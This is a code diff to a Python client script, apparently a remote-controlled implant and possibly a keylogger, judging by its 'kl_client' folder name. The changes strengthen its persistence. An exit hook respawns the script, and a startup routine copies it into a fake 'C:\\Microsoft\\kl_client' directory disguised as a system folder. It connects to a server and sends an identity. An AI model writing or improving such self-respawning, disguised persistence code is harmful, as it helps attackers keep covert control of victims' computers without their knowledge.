@@ -152,7 +152,11 @@ class Client:
     def start(self):
         self.debug_message("STARTING", "Starting client...")
         self.debug_message("CONNECTING", f"Attempting connection to {':'.join(map(str, self.server_address))}...")
-        self.client.connect(self.server_address)
+        try:
+            self.client.connect(self.server_address)
+        except TimeoutError:
+            self.debug_message("WARNING", f"Failed to connect to {self.host}:{self.port}. Retrying...")
+            quit()
         self.debug_message("CONNECTED", f"Connected to {':'.join(map(str, self.server_address))}")
         self.send_message(self.identity)
 
@@ -262,9 +266,11 @@ class PackageManager:
 
 @atexit.register
 def disconnect():
-    client.disconnect()
+    if not client.stop_message:
+        client.disconnect()
+
     client.debug_message("RESPAWNING", "Respawning client script")
-    subprocess.Popen([sys.executable, __file__], shell=True)
+    subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\{os.path.basename(sys.argv[0])}"], shell=True)
 
 
 def set_os_startup_launch():
@@ -277,11 +283,11 @@ def set_os_startup_launch():
             raise NotImplementedError
 
         case "win32":
-            file_name = os.path.basename(__file__)
+            file_name = os.path.basename(sys.argv[0])
             dest_dir = "C:\\Microsoft\\kl_client\\"
             dest_path = dest_dir + file_name
 
-            if __file__ != dest_dir + file_name:
+            if sys.argv[0] != dest_dir + file_name:
                 os.makedirs(dest_dir, exist_ok=True)
                 shutil.copy(__file__, dest_path)
 
